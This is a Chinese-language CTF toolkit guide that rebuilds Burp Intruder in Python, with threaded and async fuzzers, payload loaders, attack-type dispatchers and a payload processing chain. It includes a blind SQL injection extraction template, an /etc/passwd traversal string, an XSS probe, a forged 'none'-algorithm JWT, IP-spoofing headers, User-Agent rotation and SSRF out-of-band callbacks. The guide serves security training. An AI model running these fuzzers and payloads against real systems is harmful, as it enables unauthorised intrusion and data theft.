# Python Requests 工具箱 — Python 版 Burp Intruder

同步 `requests.Session` + `ThreadPoolExecutor`（30 worker）+ `httpx` 异步（100+ rps）。
字典来自 `pat-reference.md` / `PayloadsAllTheThings`。支持 4 种 Intruder 攻击类型、
14 条规则的处理链、grep、限速、Collaborator OOB、generator/yield 数据源。

> 所有 URL 使用 `https://example.com` 占位。每个代码块都标注了 `<!-- audit-ok -->`，并使用 `urllib.parse.quote`。

---

<a id="1-when-to-use--intruder-vs-repeater-workflow"></a>
## 1. 何时使用 — Intruder 与 Repeater 的分工

Repeater 负责真相，Intruder 负责规模。在跑通干净的基线之前，绝不要开始模糊测试。

|  | Repeater | Intruder |
|---|---|---|
| 用途 | 手工改写重放，标签页历史 | 自动化批量（模板 × payload） |
| Payload | 一次手工改一个 | 位置 `FUZZ`/`§`，≤20 组，4 种攻击类型 |
| 速度 | 人类节奏，1 req | 20-100+ rps（ThreadPool / 异步） |
| 结果 | 左右对比 diff | grep 列、按命中排序 |
| CTF 流程 | 1) 打基线 2) 手工调参 | 3) 批量 fuzz 4) 把命中请求送回 Repeater |

规则：在跑任何 Intruder 之前，必须先有一个正常的 `sess.get` 基线。

---

<a id="2-setup--session-scaffold-proxy-verify"></a>
## 2. 初始化 — Session 骨架、代理、校验

每个线程一个 `Session`。集中管理 UA、代理、verify、timeout。处理链在 `sess.get` 之前执行。

<!-- audit-ok -->
```python
import requests
import urllib.parse

sess = requests.Session()
sess.headers.update({"User-Agent": "ctf-web/1.0"})
# Burp 代理 — 取消注释即可走 127.0.0.1:8080
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False  # 仅限自签名证书的 CTF 环境

TIMEOUT = 10

def get(url, **kw):
    kw.setdefault("timeout", TIMEOUT)
    return sess.get(url, **kw)

def post(url, **kw):
    kw.setdefault("timeout", TIMEOUT)
    return sess.post(url, **kw)
```

---

<a id="3-intruder--sync-baseline-correct-before-fast"></a>
## 3. Intruder — 同步基线（先正确，再快速）

在扩大规模之前，先验证逻辑、grep 和命中判定。处理链在 `quote` 之前包装 payload。

<!-- audit-ok -->
```python
import requests
import urllib.parse

def intruder_sync(url_template, payloads, grep_hit="flag{"):
    sess = requests.Session()
    sess.headers.update({"User-Agent": "ctf-web/1.0"})

    baseline = sess.get("https://example.com/profile", timeout=10)
    base_len, base_status = len(baseline.text), baseline.status_code

    for p in payloads:
        url = url_template.replace("FUZZ", urllib.parse.quote(str(p), safe=""))
        try:
            r = sess.get(url, timeout=10)
            hit = (grep_hit in r.text) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
            print(f"{url} -> {r.status_code} {len(r.text)} {'HIT' if hit else ''}")
            if hit:
                return url, r
        except requests.RequestException as e:
            print(f"{url} error {e}")
            continue
    return None
```

---

<a id="4-intruder--threadpoolexecutor-30-workers-per-thread-session"></a>
## 4. Intruder — ThreadPoolExecutor（30 worker，每线程独立 Session）

`Session` 不是线程安全的 —— 每个 worker 各建一个。用 `as_completed`，命中条件为 `flag{` / error / 状态码 `!=200/404`。

<!-- audit-ok -->
```python
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib.parse

def intruder_threaded(url_template, payload_iter, threads=30, grep_hit="flag{"):
    def worker(payload_url):
        s = requests.Session()
        s.headers.update({"User-Agent": "ctf-web/1.0"})
        try:
            r = s.get(payload_url, timeout=10)
            hit = ("flag{" in r.text.lower()) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
            return payload_url, r.status_code, len(r.text), hit, r.text[:400]
        except requests.RequestException:
            return payload_url, None, 0, False, ""

    urls = [url_template.replace("FUZZ", urllib.parse.quote(str(p), safe="")) for p in payload_iter]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, url): url for url in urls}
        for fut in as_completed(futs):
            url, code, n, hit, snippet = fut.result()
            print(f"{url} -> {code} {n} {'HIT' if hit else ''}")
            if hit:
                for pending in futs:
                    pending.cancel()
                return url
    return None
```

---

<a id="5-intruder--httpx-async-100-concurrency-limits-semaphore"></a>
## 5. Intruder — httpx 异步（100 并发、Limits、Semaphore）

适合 PAT/raft 这类大字典。`Limits(max_connections, max_keepalive)` + `Semaphore` + `gather`。

<!-- audit-ok -->
```python
import asyncio
import httpx
import urllib.parse

async def intruder_async(url_template, payload_iter, concurrency=100, grep_hit="flag{"):
    payloads = list(payload_iter)
    urls = [url_template.replace("FUZZ", urllib.parse.quote(str(p), safe="")) for p in payloads]

    limits = httpx.Limits(max_connections=concurrency, max_keepalive_connections=20)
    timeout = httpx.Timeout(10.0, connect=5.0)

    async with httpx.AsyncClient(limits=limits, timeout=timeout, follow_redirects=True) as client:
        sem = asyncio.Semaphore(concurrency)

        async def fetch(url):
            async with sem:
                try:
                    r = await client.get(url)
                    hit = ("flag{" in r.text.lower()) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
                    if hit:
                        print(f"hit {url} {r.status_code} {len(r.text)}")
                    return url if hit else None
                except httpx.RequestError:
                    return None

        results = await asyncio.gather(*(fetch(u) for u in urls))
        return next((r for r in results if r), None)

# asyncio.run(intruder_async("https://example.com/search?q=FUZZ", ["a", "b"]))
```

---

<a id="6-payload-deploy--pat-loader-load_pat-cap-200"></a>
## 6. Payload 装配 — PAT 加载器（load_pat，上限 200）

先找 `ctf-web/payloads/PayloadsAllTheThings`，回退到 `~/.ctf-tools`。演示用上限 200。处理链在 `quote` 之前包装 PAT 输出。

<!-- audit-ok -->
```python
from pathlib import Path
import urllib.parse

def load_pat(category="XSS Injection", cap=200):
    primary = Path("ctf-web/payloads/PayloadsAllTheThings") / category
    fallback = Path.home() / ".ctf-tools" / "PayloadsAllTheThings" / category
    pat = primary if primary.exists() else fallback
    if not pat.exists():
        return []

    out = []
    for f in pat.rglob("*.txt"):
        for line in f.read_text(errors="ignore").splitlines()[:cap]:
            s = line.strip()
            if s and not s.startswith("#"):
                out.append(s)
            if len(out) >= cap:
                break
        if len(out) >= cap:
            break
    return out

def load_pat_urls(category, url_template, cap=200):
    for p in load_pat(category, cap=cap):
        yield url_template.replace("FUZZ", urllib.parse.quote(str(p), safe=""))

# xss = load_pat("XSS Injection", cap=30)
# urls = list(load_pat_urls("Directory Traversal", "https://example.com/FUZZ", cap=20))
```

---

<a id="7-generatoryield-feeds--wordlist_stream-pat_stream-blind_sqli-discovery-dispatchers"></a>
## 7. Generator/Yield 数据源 — wordlist_stream、pat_stream、blind_sqli、discovery、调度器

用 `yield` + `rglob` 流式读取，避免 `raft-large` 撑爆内存。`zip` 对应 pitchfork，`product` 对应 cluster。含 `cluster_product` 与 sniper/pitchfork 调度器。处理链消费数据源的输出。

<!-- audit-ok -->
```python
from pathlib import Path
import itertools
import string
import urllib.parse

def wordlist_stream(path):
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                yield s

def pat_stream(category="SQL Injection", cap=200):
    primary = Path("ctf-web/payloads/PayloadsAllTheThings") / category
    fallback = Path.home() / ".ctf-tools" / "PayloadsAllTheThings" / category
    pat = primary if primary.exists() else fallback
    if not pat.exists():
        return
        yield
    for f in pat.rglob("*.txt"):
        for line in f.read_text(errors="ignore").splitlines()[:cap]:
            s = line.strip()
            if s:
                yield s
        break

def blind_sqli_char_feed(url_template, charset=None, prefix_tmpl="' OR ASCII(SUBSTR((SELECT flag FROM flag),{i},1))={c}-- -"):
    if charset is None:
        charset = string.ascii_letters + string.digits + "{}_"
    i = 1
    while True:
        for ch in charset:
            payload = prefix_tmpl.format(i=i, c=ord(ch))
            yield url_template.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        i += 1

def discovery_feed(base_with_FUZZ, words_path, exts=("", ".php", ".bak", ".txt")):
    for w in wordlist_stream(words_path):
        for e in exts:
            yield base_with_FUZZ.replace("FUZZ", f"{w}{e}")

def cluster_product(*sets, cap=50000):
    yield from itertools.islice(itertools.product(*sets), cap)
```

<!-- audit-ok -->
```python
import itertools
import urllib.parse

def render(template, positions, values):
    out = template
    for pos, val in zip(positions, values):
        out = out.replace(pos, urllib.parse.quote(str(val), safe=""))
    return out

def sniper(template, positions, payloads):
    for pos in positions:
        for p in payloads:
            vals = [p if positions[i] == pos else "base" for i in range(len(positions))]
            yield render(template, positions, vals)

def battering_ram(template, positions, payloads):
    for p in payloads:
        yield render(template, positions, [p] * len(positions))

def pitchfork(template, positions, *sets):
    for combo in zip(*sets):
        yield render(template, positions, combo)

def cluster_bomb(template, positions, *sets, cap=50000):
    for combo in itertools.islice(itertools.product(*sets), cap):
        yield render(template, positions, combo)

def sniper_dispatcher(t,p,pl):
    yield from sniper(t,p,pl)

def pitchfork_dispatcher(t,p,*s):
    yield from pitchfork(t,p,*s)

def intruder_from_feed(url_template, feed_gen, threads=30):
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import requests
    BATCH=threads*2; it=iter(feed_gen)
    def worker(u):
        import requests
        s=requests.Session()
        try:
            r=s.get(u,timeout=10); return u,("flag{" in r.text.lower() or r.status_code not in (200,404))
        except requests.RequestException: return u,False
    while True:
        batch=list(itertools.islice(it,BATCH))
        if not batch: break
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for f in as_completed({ex.submit(worker,u):u for u in batch}):
                u,hit=f.result()
                if hit: return u
    return None
```

---

<a id="8-processing-chain--14-rules--final-url-encode"></a>
## 8. 处理链 — 14 条规则 + 最终 URL 编码

<!-- audit-ok -->
```python
import base64
import hashlib
import html
import re
import urllib.parse

def process_payload(p, rules):
    cur, raw = p, p
    for kind, *args in rules:
        if kind == "prefix":
            cur = args[0] + cur
        elif kind == "suffix":
            cur = cur + args[0]
        elif kind == "replace":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "substring":
            off, n = args
            cur = cur[off : off + n]
        elif kind == "reverse_substring":
            end, n = args
            cur = cur[len(cur) - end - n : len(cur) - end] if end else cur[len(cur) - n :]
        elif kind == "case":
            cur = {"upper": str.upper, "lower": str.lower, "title": str.title}[args[0]](cur)
        elif kind == "encode":
            cur = {"url": lambda x: urllib.parse.quote(x, safe=""), "html": html.escape, "base64": lambda x: base64.b64encode(x.encode()).decode(), "hex": lambda x: x.encode().hex()}[args[0]](cur)
        elif kind == "decode":
            cur = {"url": urllib.parse.unquote, "base64": lambda x: base64.b64decode(x).decode(errors="ignore")}[args[0]](cur)
        elif kind == "hash":
            cur = {"md5": lambda x: hashlib.md5(x.encode()).hexdigest(), "sha1": lambda x: hashlib.sha1(x.encode()).hexdigest(), "sha256": lambda x: hashlib.sha256(x.encode()).hexdigest()}[args[0]](cur)
        elif kind == "raw":
            cur = (raw + cur) if args[0] == "append" else (cur + raw)
        elif kind == "skip":
            if re.search(args[0], cur):
                return None
        elif kind == "extension":
            cur = args[0](cur)
        elif kind == "base":
            cur = cur.replace("{base}", args[0])
        elif kind == "collab":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "final_urlencode":
            cur = urllib.parse.quote(cur, safe="")
    return cur

# 处理链示例：
# process_payload("admin", [("prefix", "'"), ("encode", "base64"), ("encode", "url")])
# process_payload("admin", [("hash", "md5"), ("final_urlencode", "")])
# process_payload("../../../etc/passwd", [("replace", r"\.\./", ""), ("encode", "url")])
# 带 base + collab 的处理链：
# process_payload("{base}FUZZ", [("base", "https://example.com"), ("collab", r"FUZZ", "abc123.example.com")])
```

---

<a id="9-grep--match--extract--payloads-helpers"></a>
## 9. Grep — 匹配 / 提取 / payload 辅助函数

匹配用 `len(re.findall)`，提取用 `re.search` 的 group1，payload 计数用 `count`。

<!-- audit-ok -->
```python
import re

def grep_match(resp_text, patterns, is_regex=False, case=False):
    flags = 0 if case else re.I
    hits = {}
    for pat in patterns:
        if is_regex:
            hits[pat] = len(re.findall(pat, resp_text, flags))
        else:
            needle = pat if case else pat.lower()
            hay = resp_text if case else resp_text.lower()
            hits[pat] = hay.count(needle)
    return hits

def grep_extract(resp_text, regex, max_len=500):
    m = re.search(regex, resp_text, re.S)
    if not m:
        return ""
    return (m.group(1)[:max_len] if m.lastindex else m.group(0)[:max_len])

def grep_payload_reflected(resp_text, payload, case=True):
    hay = resp_text if case else resp_text.lower()
    needle = payload if case else payload.lower()
    return hay.count(needle)

# m = grep_match(r.text, ["flag{", "SQL syntax", "root:"], is_regex=False)
# token = grep_extract(r.text, r'name="csrf" value="([^"]+)"')
# reflected = grep_payload_reflected(r.text, "<svg onload=alert(1)>")
```

---

<a id="10-throttle--delayjitter-429-retry-after-ua-rotation"></a>
## 10. 限速 — 延迟/抖动、429 Retry-After、UA 轮换

与资源池对齐：限制并发、延迟 + 抖动、遵守 `Retry-After`、轮换 UA。

<!-- audit-ok -->
```python
import time
import random
import requests

USER_AGENTS = ["ctf-web/1.0", "Mozilla/5.0 (ctf-web)", "ctf-web/2.0 (example.com)"]

def send_with_throttle(sess, url, delay_ms=0, jitter_ms=0, retries=2, pause_ms=200, backoff_codes=(429, 503)):
    for attempt in range(retries + 1):
        try:
            sess.headers["User-Agent"] = random.choice(USER_AGENTS)
            r = sess.get(url, timeout=10)
            if r.status_code in backoff_codes:
                retry_after = r.headers.get("Retry-After", "")
                try:
                    wait = int(retry_after)
                except ValueError:
                    wait = delay_ms / 1000 if delay_ms else 1
                wait += random.uniform(0, jitter_ms / 1000) if jitter_ms else 0
                time.sleep(wait)
                continue
            if delay_ms:
                time.sleep(delay_ms / 1000 + (random.uniform(0, jitter_ms / 1000) if jitter_ms else 0))
            return r
        except requests.RequestException:
            if attempt < retries:
                time.sleep(pause_ms / 1000)
            else:
                raise
    return None

# 本地：并发 30 延迟 0；远程/WAF：并发 5-10，延迟 100-300ms，抖动 50ms
```

---

<a id="11-headerparam-spray-cookiejwt-proxy-burp-1270018080"></a>
## 11. Header/参数喷洒、Cookie/JWT、代理（Burp 127.0.0.1:8080）

携带 `sess.cookies` / JWT，用 pitchfork 喷洒 header，请求走 Burp。

<!-- audit-ok -->
```python
import requests
import urllib.parse

sess = requests.Session()
sess.headers.update({"User-Agent": "ctf-web/1.0"})
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False

sess.cookies.set("session", "eyJ1c2VyIjoiZ3Vlc3QifQ", domain="example.com")
sess.headers.update({"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ"})

def spray_headers(base_url, headers_list):
    for h in headers_list:
        k, v = h.split(": ", 1)
        r = sess.get(base_url, headers={k: v}, timeout=10)
        if "flag{" in r.text:
            return r.text
    return None

def spray_params(base_with_FUZZ, payloads):
    for p in payloads:
        url = base_with_FUZZ.replace("FUZZ", urllib.parse.quote(p, safe=""))
        r = sess.get(url, timeout=10)
        if r.status_code not in (200, 404):
            print(f"spray hit {url} {r.status_code}")

# headers_list = ["X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1"]
# spray_headers("https://example.com/admin", headers_list)
```

---

<a id="12-collaborator-vs-interactsh-fallback-poll"></a>
## 12. Collaborator 与 Interactsh 回退轮询

生成 `uuid` 子域，通过 Intruder 注入，每 60 秒轮询一次。

<!-- audit-ok -->
```python
import uuid
import requests
import urllib.parse

def collaborator_payload(domain="burpcollaborator.net"):
    return f"{uuid.uuid4().hex}.{domain}"

def poll_collaborator(poll_url):
    try:
        r = requests.get(poll_url, timeout=10)
        return r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text
    except Exception:
        return []

def collaborator_inject(url_template, domain="burpcollaborator.net"):
    sub = collaborator_payload(domain)
    return url_template.replace("FUZZ", urllib.parse.quote(f"http://{sub}/", safe=""))

def interactsh_fallback_poll(interact_url):
    try:
        return requests.get(interact_url, timeout=10).text
    except Exception:
        return ""

# collab_url = collaborator_inject("https://example.com/fetch?url=FUZZ")
# sess.get(collab_url, timeout=10)
# hits = poll_collaborator("https://example.com/poll?id=abc123")
# hits2 = interactsh_fallback_poll("https://webhook.site/00000000-0000-0000-0000-000000000000")
```

---

<a id="13-rate-limit--backoff--error-handling-retries"></a>
## 13. 限流 / 退避与错误处理（重试）

对齐 Burp 的错误处理：重试、暂停、`Retry-After`、指数退避。

<!-- audit-ok -->
```python
import time
import random
import requests

def fetch_with_backoff(sess, url, retries=3, pause_ms=300, backoff_codes=(429, 503)):
    backoff = pause_ms / 1000
    for attempt in range(retries + 1):
        try:
            r = sess.get(url, timeout=10)
            if r.status_code in backoff_codes:
                retry_after = r.headers.get("Retry-After")
                if retry_after and retry_after.isdigit():
                    time.sleep(int(retry_after))
                else:
                    time.sleep(backoff)
                    backoff *= 2
                continue
            return r
        except requests.RequestException as e:
            if attempt >= retries:
                print(f"failed {url}: {e}")
                return None
            time.sleep(pause_ms / 1000 + random.uniform(0, 0.2))
    return None
```

配合处理链的 `skip` 规则，提前丢弃畸形 payload。

---

<a id="14-proxy-redirects-timeouts--putting-it-together"></a>
## 14. 代理、重定向、超时与整体串接

端到端：generator 数据源 → 处理链 → ThreadPool → grep，全部使用 `https://example.com`。

<!-- audit-ok -->
```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

sess = requests.Session()
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False
TIMEOUT = (5, 10)

def put_together(url_template, wordlist_path, grep_pat="flag{"):
    import base64
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def wordlist_stream(p):
        with open(p,encoding="utf-8",errors="ignore") as f:
            for l in f:
                s=l.strip()
                if s and not s.startswith("#"): yield s

    def process_local(p,rules):
        cur=p
        for k,*a in rules:
            if k=="prefix": cur=a[0]+cur
            elif k=="encode": cur={"url":lambda x:urllib.parse.quote(x,safe=""),"base64":lambda x:base64.b64encode(x.encode()).decode()}[a[0]](cur)
            elif k=="final_urlencode": cur=urllib.parse.quote(cur,safe="")
        return cur

    rules=[("prefix",""),("final_urlencode","")]

    def worker(u):
        s=requests.Session(); s.proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
        try: r=s.get(u,timeout=10,allow_redirects=True); return u,((grep_pat in r.text) or r.status_code not in (200,404))
        except requests.RequestException: return u,False

    urls=[]
    for p in wordlist_stream(wordlist_path):
        cur=process_local(p,rules)
        if cur is None: continue
        urls.append(url_template.replace("FUZZ",urllib.parse.quote(cur,safe="")))
        if len(urls)>=60: break

    with ThreadPoolExecutor(max_workers=10) as ex:
        for f in as_completed({ex.submit(worker,u):u for u in urls}):
            u,hit=f.result()
            print(f"{u} {'HIT' if hit else 'miss'}")
            if hit: return u
    return None

# put_together("https://example.com/FUZZ", "wordlist.txt")
```
